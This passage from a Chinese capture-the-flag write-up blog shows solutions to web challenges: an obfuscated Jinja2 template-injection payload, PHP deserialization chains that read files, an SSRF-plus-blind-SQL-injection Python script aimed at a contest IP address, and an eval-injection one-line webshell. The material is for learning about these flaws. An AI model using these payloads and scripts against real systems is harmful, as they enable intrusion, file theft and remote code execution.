class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ca = dict(ca=aa,t=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> flg = dict(fl=aa,ag=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ev = dict(ev=aa,al=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> red = dict(re=aa,ad=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ini = dict(ini=aa,t=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> glo = dict(glo=aa,bals=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> itm = dict(ite=aa,ms=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> f == bul %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> a,b in (v|attr(itm))() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> a == ev %&#125;</span><span class="template-variable">&#123;&#123;b(pld)&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>


<h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>


<p>SLP类中存在能够进行文件处理和迭代的类：</p>
<table>
<thead>
<tr>
<th align="left">类</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DirectoryIterator</td>
<td align="left">遍历目录</td>
</tr>
<tr>
<td align="left">FilesystemIterator</td>
<td align="left">遍历目录</td>
</tr>
<tr>
<td align="left">GlobIterator</td>
<td align="left">遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
</tr>
<tr>
<td align="left">SplFileObject</td>
<td align="left">读取文件，按行读取，多行需要遍历</td>
</tr>
<tr>
<td align="left">finfo/finfo_open()</td>
<td align="left">需要两个参数</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历php本身内置类</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实真正用到的也就是Class A</p>
<p><strong>payload:</strong></p>
<p>1.遍历文件</p>
<p>通过遍历，我们知道FilesystemIterator类有toSring方法，可以利用</p>
<p><img src="https://img.npfs06.top/20210406225357.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$o</span>  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$o</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2.读取flag文件</p>
<p>通过遍历，我们知道SplFileObject类有toSring方法，可以利用</p>
<p><img src="https://img.npfs06.top/20210406225302.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>


<h1 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no session&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(check_inner_ip(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$url</span>)&#123;</span><br><span class="line">            <span class="variable">$ch</span> = curl_init();</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your IP is internal yoyoyo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">no session</span><br></pre></td></tr></table></figure>
<p>要求存在session，可以利用PHP_SESSION_UPLOAD_PROGRESS设置PHPSESSID=flag</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://183.129.189.60:10015/?url=http://localhost/admin.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>随便传一个文件，同时添加Cookie即可</p>
<p>SSRF，其中外部ip、127.0.0.1都被ban了，localhost可以，这里有个admin.php</p>
<p><img src="https://img.npfs06.top/20210407191625.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>访问路径，下载压缩包</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//se1f_Log3n.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/db.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> !== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; and `password`=&quot;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$con</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc() <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>)) <span class="keyword">OR</span> ( (<span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>) )); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>sql注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">127</span>:</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># url = &quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or length(database())&gt;0-- %26password=admin&quot;</span></span><br><span class="line">        <span class="comment"># url = &quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or ascii(substr((select password from users where username=&#x27;admin&#x27;),%d,1))=%d-- %26password=&quot;%(len(flag)+1,i)</span></span><br><span class="line">        <span class="comment"># url = &quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or ascii(substr(hex((select password from users where username=&#x27;admin&#x27;)),&#123;&#125;,1))=&#123;&#125;-- %26password=&quot;.format(len(flag)+1,j)</span></span><br><span class="line">        <span class="comment"># url = &quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or ascii(substr((database()),&#123;&#125;,1))=&#123;&#125;-- %26password=&quot;.format(len(flag)+1,j)</span></span><br><span class="line">        url = <span class="string">&quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or ascii(substr((load_file(&#x27;/flag&#x27;)),&#123;&#125;,1))=&#123;&#125;-- %26password=&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>,j)</span><br><span class="line">        session = requests.session()</span><br><span class="line">        response = session.post(url,data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;,files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/Administrator/Desktop/1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)   //这里的文件名是本地随意创建的</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;correct?&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>PHP_Code_challenge(代码审计)</title>
    <url>/2020/04/20/PHP-Code-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p>PHP_Code_challenge(代码审计) write up<a id="more"></a></p>
<h1 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex(<span class="variable">$flag</span>)))), <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>


<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strrev</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> string[::-<span class="number">1</span>]</span><br><span class="line">a=<span class="string">&quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;</span></span><br><span class="line">b=binascii.a2b_hex(strrev(binascii.b2a_hex(base64.b64decode(a))))</span><br><span class="line"><span class="built_in">print</span> (b)</span><br></pre></td></tr></table></figure>


<blockquote>
<p>binascii模块用来进行进制和字符串之间的转换<br>base64模块是用来作base64编码解码<br>[::-1]取反，这里-1为步长</p>
</blockquote>
<h1 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;The time must be number.&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;This time is too short.&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;This time is too long.&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        sleep((<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>


<blockquote>
<p>sleep() 函数用来推迟调用线程的运行<br>(int)强转换，可以用科学记数法绕过</p>
</blockquote>
<h1 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--challenge3.txt--&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: challenge3.php?id=1&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hahahahahaha&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;1112 is a nice lab!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> strlen(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">&quot;111&quot;</span>.substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;work harder!harder!harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>a–&gt;</p>
<p> ①不存在’.’号或’.’号再开头；</p>
<p> ②<code>$data = @file_get_contents($a,&#39;r&#39;);</code>把a写入字符串中要为1112 is a nice lab!</p>
<p>b–&gt;</p>
<p>①长度大于五</p>
<p>②截取b的第一位和111拼接能和1114匹配</p>
<p>③b的第一位不为4</p>
<p>id–&gt;</p>
<p>①不为0或NULL（不为空）</p>
<p>②弱等于0</p>
<blockquote>
<p>a:   $a=php://input;     post:1112 is a nice lab!<br>b:   %00截断，%00截断对substr有效，对strlen无效（即%00不会对strlen截断）<br>php弱类型比较，数字与字符串等值比较时，字符串取开头的有效数字，无则为0</p>
</blockquote>
<h1 id="challenge-4"><a href="#challenge-4" class="headerlink" title="challenge 4"></a>challenge 4</h1><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>); </span><br></pre></td></tr></table></figure>


<blockquote>
<p>构造一句话木马   <code>?hello=);eval($_POST[value]);%23</code><br>当var_dump($a);后的结果为：<code>string(22) &quot;);eval($_POST[value]);#&quot;</code><br><code>eval(&quot;string(23) &quot;);eval($_POST[value]);//&quot;&quot;);</code></p>
</blockquote>
<blockquote>
<p>PHP对于双引号包裹起来的字符串要进行扫描计算，单引号则不管内容如何都会原样输出而不会进行计算。</p>
</blockquote>
<h1 id="challenge-5"><a href="#challenge-5" class="headerlink" title="challenge 5"></a>challenge 5</h1><p><strong>源码</strong></p>
